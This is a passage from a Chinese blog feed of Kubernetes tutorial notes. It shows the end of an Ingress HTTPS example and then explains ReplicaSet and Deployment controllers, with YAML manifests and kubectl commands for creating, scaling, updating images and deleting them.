class="line"><span class="meta prompt_"># </span><span class="language-bash">创建</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl create -f ingress-https.yaml</span><br><span class="line">ingress.extensions/ingress-https created</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl get ing ingress-https -n dev</span><br><span class="line">NAME            HOSTS                                  ADDRESS         PORTS     AGE</span><br><span class="line">ingress-https   nginx.itheima.com,tomcat.itheima.com   10.104.184.38   80, 443   2m42s</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看详情</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl describe ing ingress-https -n dev</span><br><span class="line">...</span><br><span class="line">TLS:</span><br><span class="line">  tls-secret terminates nginx.itheima.com,tomcat.itheima.com</span><br><span class="line">Rules:</span><br><span class="line">Host              Path Backends</span><br><span class="line">----              ---- --------</span><br><span class="line">nginx.itheima.com  /  nginx-service:80 (10.244.1.97:80,10.244.1.98:80,10.244.2.119:80)</span><br><span class="line">tomcat.itheima.com /  tomcat-service:8080(10.244.1.99:8080,10.244.2.117:8080,10.244.2.120:8080)</span><br><span class="line">...</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下面可以通过浏览器访问https://nginx.itheima.com:31335 和 https://tomcat.itheima.com:31335来查看了</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Doc </category>
          
          <category> Kubernetes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kubernetes </tag>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kubernetes笔记 6</title>
      <link href="/2022/07/13/287f8a7d1e24-q1jun/"/>
      <url>/2022/07/13/287f8a7d1e24-q1jun/</url>
      
        <content type="html"><![CDATA[<h1 id="6-Pod控制器详解"><a href="#6-Pod控制器详解" class="headerlink" title="6. Pod控制器详解"></a>6. Pod控制器详解</h1><h2 id="6-1-Pod控制器介绍"><a href="#6-1-Pod控制器介绍" class="headerlink" title="6.1 Pod控制器介绍"></a>6.1 Pod控制器介绍</h2><p>Pod是kubernetes的最小管理单元，在kubernetes中，按照pod的创建方式可以将其分为两类：</p><ul><li>自主式pod：kubernetes直接创建出来的Pod，这种pod删除后就没有了，也不会重建</li><li>控制器创建的pod：kubernetes通过控制器创建的pod，这种pod删除了之后还会自动重建</li></ul><blockquote><p><strong><code>什么是Pod控制器</code></strong></p><p>Pod控制器是管理pod的中间层，使用Pod控制器之后，只需要告诉Pod控制器，想要多少个什么样的Pod就可以了，它会创建出满足条件的Pod并确保每一个Pod资源处于用户期望的目标状态。如果Pod资源在运行中出现故障，它会基于指定策略重新编排Pod。</p></blockquote><p>在kubernetes中，有很多类型的pod控制器，每种都有自己的适合的场景，常见的有下面这些：</p><ul><li>ReplicationController：比较原始的pod控制器，已经被废弃，由ReplicaSet替代</li><li>ReplicaSet：保证副本数量一直维持在期望值，并支持pod数量扩缩容，镜像版本升级</li><li>Deployment：通过控制ReplicaSet来控制Pod，并支持滚动升级、回退版本</li><li>Horizontal Pod Autoscaler：可以根据集群负载自动水平调整Pod的数量，实现削峰填谷</li><li>DaemonSet：在集群中的指定Node上运行且仅运行一个副本，一般用于守护进程类的任务</li><li>Job：它创建出来的pod只要完成任务就立即退出，不需要重启或重建，用于执行一次性任务</li><li>Cronjob：它创建的Pod负责周期性任务控制，不需要持续后台运行</li><li>StatefulSet：管理有状态应用</li></ul><h2 id="6-2-ReplicaSet-RS"><a href="#6-2-ReplicaSet-RS" class="headerlink" title="6.2 ReplicaSet(RS)"></a>6.2 ReplicaSet(RS)</h2><p>ReplicaSet的主要作用是<strong>保证一定数量的pod正常运行</strong>，它会持续监听这些Pod的运行状态，一旦Pod发生故障，就会重启或重建。同时它还支持对pod数量的扩缩容和镜像版本的升降级。</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20200612005334159.png" alt="img"></p><p>ReplicaSet的资源清单文件：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span> <span class="comment"># 版本号</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ReplicaSet</span> <span class="comment"># 类型       </span></span><br><span class="line"><span class="attr">metadata:</span> <span class="comment"># 元数据</span></span><br><span class="line">  <span class="attr">name:</span> <span class="comment"># rs名称 </span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="comment"># 所属命名空间 </span></span><br><span class="line">  <span class="attr">labels:</span> <span class="comment">#标签</span></span><br><span class="line">    <span class="attr">controller:</span> <span class="string">rs</span></span><br><span class="line"><span class="attr">spec:</span> <span class="comment"># 详情描述</span></span><br><span class="line">  <span class="attr">replicas:</span> <span class="number">3</span> <span class="comment"># 副本数量</span></span><br><span class="line">  <span class="attr">selector:</span> <span class="comment"># 选择器，通过它指定该控制器管理哪些pod</span></span><br><span class="line">    <span class="attr">matchLabels:</span>      <span class="comment"># Labels匹配规则</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">nginx-pod</span></span><br><span class="line">    <span class="attr">matchExpressions:</span> <span class="comment"># Expressions匹配规则</span></span><br><span class="line">      <span class="bullet">-</span> &#123;<span class="attr">key:</span> <span class="string">app</span>, <span class="attr">operator:</span> <span class="string">In</span>, <span class="attr">values:</span> [<span class="string">nginx-pod</span>]&#125;</span><br><span class="line">  <span class="attr">template:</span> <span class="comment"># 模板，当副本数量不足时，会根据下面的模板创建pod副本</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">nginx-pod</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">nginx:1.17.1</span></span><br><span class="line">        <span class="attr">ports:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">containerPort:</span> <span class="number">80</span></span><br></pre></td></tr></table></figure><p>在这里面，需要新了解的配置项就是<code>spec</code>下面几个选项：</p><ul><li><p>replicas：指定副本数量，其实就是当前rs创建出来的pod的数量，默认为1</p></li><li><p>selector：选择器，它的作用是建立pod控制器和pod之间的关联关系，采用的Label Selector机制</p><p>在pod模板上定义label，在控制器上定义选择器，就可以表明当前控制器能管理哪些pod了</p></li><li><p>template：模板，就是当前控制器创建pod所使用的模板板，里面其实就是前一章学过的pod的定义</p></li></ul><p><strong>创建ReplicaSet</strong></p><p>创建pc-replicaset.yaml文件，内容如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ReplicaSet</span>   </span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pc-replicaset</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">dev</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">replicas:</span> <span class="number">3</span></span><br><span class="line">  <span class="attr">selector:</span> </span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">nginx-pod</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">nginx-pod</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">nginx:1.17.1</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建rs</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl create -f pc-replicaset.yaml</span><br><span class="line">replicaset.apps/pc-replicaset created</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看rs</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">DESIRED:期望副本数量</span>  </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">CURRENT:当前副本数量</span>  </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">READY:已经准备好提供服务的副本数量</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl get rs pc-replicaset -n dev -o wide</span><br><span class="line">NAME          DESIRED   CURRENT READY AGE   CONTAINERS   IMAGES             SELECTOR</span><br><span class="line">pc-replicaset 3         3       3     22s   nginx        nginx:1.17.1       app=nginx-pod</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看当前控制器创建出来的pod</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">这里发现控制器创建出来的pod的名称是在控制器名称后面拼接了-xxxxx随机码</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl get pod -n dev</span><br><span class="line">NAME                          READY   STATUS    RESTARTS   AGE</span><br><span class="line">pc-replicaset-6vmvt   1/1     Running   0          54s</span><br><span class="line">pc-replicaset-fmb8f   1/1     Running   0          54s</span><br><span class="line">pc-replicaset-snrk2   1/1     Running   0          54s</span><br></pre></td></tr></table></figure><p><strong>扩缩容</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编辑rs的副本数量，修改spec:replicas: 6即可</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl edit rs pc-replicaset -n dev</span><br><span class="line">replicaset.apps/pc-replicaset edited</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看pod</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl get pods -n dev</span><br><span class="line">NAME                          READY   STATUS    RESTARTS   AGE</span><br><span class="line">pc-replicaset-6vmvt   1/1     Running   0          114m</span><br><span class="line">pc-replicaset-cftnp   1/1     Running   0          10s</span><br><span class="line">pc-replicaset-fjlm6   1/1     Running   0          10s</span><br><span class="line">pc-replicaset-fmb8f   1/1     Running   0          114m</span><br><span class="line">pc-replicaset-s2whj   1/1     Running   0          10s</span><br><span class="line">pc-replicaset-snrk2   1/1     Running   0          114m</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">当然也可以直接使用命令实现</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用scale命令实现扩缩容， 后面--replicas=n直接指定目标数量即可</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl scale rs pc-replicaset --replicas=2 -n dev</span><br><span class="line">replicaset.apps/pc-replicaset scaled</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">命令运行完毕，立即查看，发现已经有4个开始准备退出了</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl get pods -n dev</span><br><span class="line">NAME                       READY   STATUS        RESTARTS   AGE</span><br><span class="line">pc-replicaset-6vmvt   0/1     Terminating   0          118m</span><br><span class="line">pc-replicaset-cftnp   0/1     Terminating   0          4m17s</span><br><span class="line">pc-replicaset-fjlm6   0/1     Terminating   0          4m17s</span><br><span class="line">pc-replicaset-fmb8f   1/1     Running       0          118m</span><br><span class="line">pc-replicaset-s2whj   0/1     Terminating   0          4m17s</span><br><span class="line">pc-replicaset-snrk2   1/1     Running       0          118m</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">稍等片刻，就只剩下2个了</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl get pods -n dev</span><br><span class="line">NAME                       READY   STATUS    RESTARTS   AGE</span><br><span class="line">pc-replicaset-fmb8f   1/1     Running   0          119m</span><br><span class="line">pc-replicaset-snrk2   1/1     Running   0          119m</span><br></pre></td></tr></table></figure><p><strong>镜像升级</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编辑rs的容器镜像 - image: nginx:1.17.2</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl edit rs pc-replicaset -n dev</span><br><span class="line">replicaset.apps/pc-replicaset edited</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">再次查看，发现镜像版本已经变更了</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl get rs -n dev -o wide</span><br><span class="line">NAME                DESIRED  CURRENT   READY   AGE    CONTAINERS   IMAGES        ...</span><br><span class="line">pc-replicaset       2        2         2       140m   nginx         nginx:1.17.2  ...</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">同样的道理，也可以使用命令完成这个工作</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">kubectl <span class="built_in">set</span> image rs rs名称 容器=镜像版本 -n namespace</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl set image rs pc-replicaset nginx=nginx:1.17.1  -n dev</span><br><span class="line">replicaset.apps/pc-replicaset image updated</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">再次查看，发现镜像版本已经变更了</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl get rs -n dev -o wide</span><br><span class="line">NAME                 DESIRED  CURRENT   READY   AGE    CONTAINERS   IMAGES            ...</span><br><span class="line">pc-replicaset        2        2         2       145m   nginx        nginx:1.17.1 ... </span><br></pre></td></tr></table></figure><p><strong>删除ReplicaSet</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用kubectl delete命令会删除此RS以及它管理的Pod</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在kubernetes删除RS前，会将RS的replicasclear调整为0，等待所有的Pod被删除后，在执行RS对象的删除</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl delete rs pc-replicaset -n dev</span><br><span class="line">replicaset.apps &quot;pc-replicaset&quot; deleted</span><br><span class="line">[root@k8s-master01 ~]# kubectl get pod -n dev -o wide</span><br><span class="line">No resources found in dev namespace.</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果希望仅仅删除RS对象（保留Pod），可以使用kubectl delete命令时添加--cascade=<span class="literal">false</span>选项（不推荐）。</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl delete rs pc-replicaset -n dev --cascade=false</span><br><span class="line">replicaset.apps &quot;pc-replicaset&quot; deleted</span><br><span class="line">[root@k8s-master01 ~]# kubectl get pods -n dev</span><br><span class="line">NAME                  READY   STATUS    RESTARTS   AGE</span><br><span class="line">pc-replicaset-cl82j   1/1     Running   0          75s</span><br><span class="line">pc-replicaset-dslhb   1/1     Running   0          75s</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">也可以使用yaml直接删除(推荐)</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl delete -f pc-replicaset.yaml</span><br><span class="line">replicaset.apps &quot;pc-replicaset&quot; deleted</span><br></pre></td></tr></table></figure><h2 id="6-3-Deployment-Deploy"><a href="#6-3-Deployment-Deploy" class="headerlink" title="6.3 Deployment(Deploy)"></a>6.3 Deployment(Deploy)</h2><p>为了更好的解决服务编排的问题，kubernetes在V1.2版本开始，引入了Deployment控制器。值得一提的是，这种控制器并不直接管理pod，而是通过管理ReplicaSet来简介管理Pod，即：Deployment管理ReplicaSet，ReplicaSet管理Pod。所以Deployment比ReplicaSet功能更加强大。</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20200612005524778.png" alt="img"></p><p>Deployment主要功能有下面几个：</p><ul><li>支持ReplicaSet的所有功能</li><li>支持发布的停止、继续</li><li>支持滚动升级和回滚版本</li></ul><p>Deployment的资源清单文件：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span> <span class="comment"># 版本号</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Deployment</span> <span class="comment"># 类型       </span></span><br><span class="line"><span class="attr">metadata:</span> <span class="comment"># 元数据</span></span><br><span class="line">  <span class="attr">name:</span> <span class="comment"># rs名称 </span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="comment"># 所属命名空间 </span></span><br><span class="line">  <span class="attr">labels:</span> <span class="comment">#标签</span></span><br><span class="line">    <span class="attr">controller:</span> <span class="string">deploy</span></span><br><span class="line"><span class="attr">spec:</span> <span class="comment"># 详情描述</span></span><br><span class="line">  <span class="attr">replicas:</span> <span class="number">3</span> <span class="comment"># 副本数量</span></span><br><span class="line">  <span class="attr">revisionHistoryLimit:</span> <span class="number">3</span> <span class="comment"># 保留历史版本</span></span><br><span class="line">  <span class="attr">paused:</span> <span class="literal">false</span> <span class="comment"># 暂停部署，默认是false</span></span><br><span class="line">  <span class="attr">progressDeadlineSeconds:</span> <span class="number">600</span> <span class="comment"># 部署超时时间（s），默认是600</span></span><br><span class="line">  <span class="attr">strategy:</span> <span class="comment"># 策略</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">RollingUpdate</span> <span class="comment"># 滚动更新策略</span></span><br><span class="line">    <span class="attr">rollingUpdate:</span> <span class="comment"># 滚动更新</span></span><br><span class="line">      <span class="attr">maxSurge:</span> <span class="number">30</span><span class="string">%</span> <span class="comment"># 最大额外可以存在的副本数，可以为百分比，也可以为整数</span></span><br><span class="line">      <span class="attr">maxUnavailable:</span> <span class="number">30</span><span class="string">%</span> <span class="comment"># 最大不可用状态的 Pod 的最大值，可以为百分比，也可以为整数</span></span><br><span class="line">  <span class="attr">selector:</span> <span class="comment"># 选择器，通过它指定该控制器管理哪些pod</span></span><br><span class="line">    <span class="attr">matchLabels:</span>      <span class="comment"># Labels匹配规则</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">nginx-pod</span></span><br><span class="line">    <span class="attr">matchExpressions:</span> <span class="comment"># Expressions匹配规则</span></span><br><span class="line">      <span class="bullet">-</span> &#123;<span class="attr">key:</span> <span class="string">app</span>, <span class="attr">operator:</span> <span class="string">In</span>, <span class="attr">values:</span> [<span class="string">nginx-pod</span>]&#125;</span><br><span class="line">  <span class="attr">template:</span> <span class="comment"># 模板，当副本数量不足时，会根据下面的模板创建pod副本</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">nginx-pod</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">nginx:1.17.1</span></span><br><span class="line">        <span class="attr">ports:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">containerPort:</span> <span class="number">80</span></span><br></pre></td></tr></table></figure><p><strong>创建deployment</strong></p><p>创建pc-deployment.yaml，内容如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Deployment</span>      </span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pc-deployment</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">dev</span></span><br><span class="line"><span class="attr">spec:</span> </span><br><span class="line">  <span class="attr">replicas:</span> <span class="number">3</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">nginx-pod</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">nginx-pod</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">nginx:1.17.1</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建deployment</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl create -f pc-deployment.yaml --record=true</span><br><span class="line">deployment.apps/pc-deployment created</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看deployment</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">UP-TO-DATE 最新版本的pod的数量</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">AVAILABLE  当前可用的pod的数量</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl get deploy pc-deployment -n dev</span><br><span class="line">NAME            READY   UP-TO-DATE   AVAILABLE   AGE</span><br><span class="line">pc-deployment   3/3     3            3           15s</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看rs</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">发现rs的名称是在原来deployment的名字后面添加了一个10位数的随机串</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl get rs -n dev</span><br><span class="line">NAME                       DESIRED   CURRENT   READY   AGE</span><br><span class="line">pc-deployment-6696798b78   3         3         3       23s</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看pod</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl get pods -n dev</span><br><span class="line">NAME                             READY   STATUS    RESTARTS   AGE</span><br><span class="line">pc-deployment-6696798b78-d2c8n   1/1     Running   0          107s</span><br><span class="line">pc-deployment-6696798b78-smpvp   1/1     Running   0          107s</span><br><span class="line">pc-deployment-6696798b78-wvjd8   1/1     Running   0          107s</span><br></pre></td></tr></table></figure><p><strong>扩缩容</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">变更副本数量为5个</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl scale deploy pc-deployment --replicas=5  -n dev</span><br><span class="line">deployment.apps/pc-deployment scaled</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看deployment</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl get deploy pc-deployment -n dev</span><br><span class="line">NAME            READY   UP-TO-DATE   AVAILABLE   AGE</span><br><span class="line">pc-deployment   5/5     5            5           2m</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看pod</span></span><br><span class="line">[root@k8s-master01 ~]#  kubectl get pods -n dev</span><br><span class="line">NAME                             READY   STATUS    RESTARTS   AGE</span><br><span class="line">pc-deployment-6696798b78-d2c8n   1/1     Running   0          4m19s</span><br><span class="line">pc-deployment-6696798b78-jxmdq   1/1     Running   0          94s</span><br><span class="line">pc-deployment-6696798b78-mktqv   1/1     Running   0          93s</span><br><span class="line">pc-deployment-6696798b78-smpvp   1/1     Running   0          4m19s</span><br><span class="line">pc-deployment-6696798b78-wvjd8   1/1     Running   0          4m19s</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编辑deployment的副本数量，修改spec:replicas: 4即可</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl edit deploy pc-deployment -n dev</span><br><span class="line">deployment.apps/pc-deployment edited</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看pod</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl get pods -n dev</span><br><span class="line">NAME                             READY   STATUS    RESTARTS   AGE</span><br><span class="line">pc-deployment-6696798b78-d2c8n   1/1     Running   0          